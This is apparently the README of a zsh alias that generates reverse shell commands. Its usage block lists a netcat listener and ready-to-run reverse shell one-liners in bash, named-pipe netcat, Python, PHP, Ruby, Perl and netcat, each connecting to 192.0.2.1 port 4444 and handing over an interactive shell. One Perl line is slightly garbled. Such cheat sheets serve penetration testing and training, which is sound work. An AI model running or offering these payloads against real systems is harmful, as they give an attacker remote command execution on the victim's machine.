# zsh-reverse-shell-generator

## Usage

Use as Zsh alias.

```
$ reverse 192.0.2.1 4444
# receive
nc -nlvp 4444

# bash
bash -i >& /dev/tcp/192.0.2.1/4444 0>&1

# named pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.1 4444 >/tmp/f

# Python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.0.2.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);

# PHP
php -r '$sock=fsockopen("192.0.2.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("192.0.2.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Perl
perl -e 'use Socket;="192.0.2.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# netcat
nc -e /bin/sh 192.0.2.1 4444
```
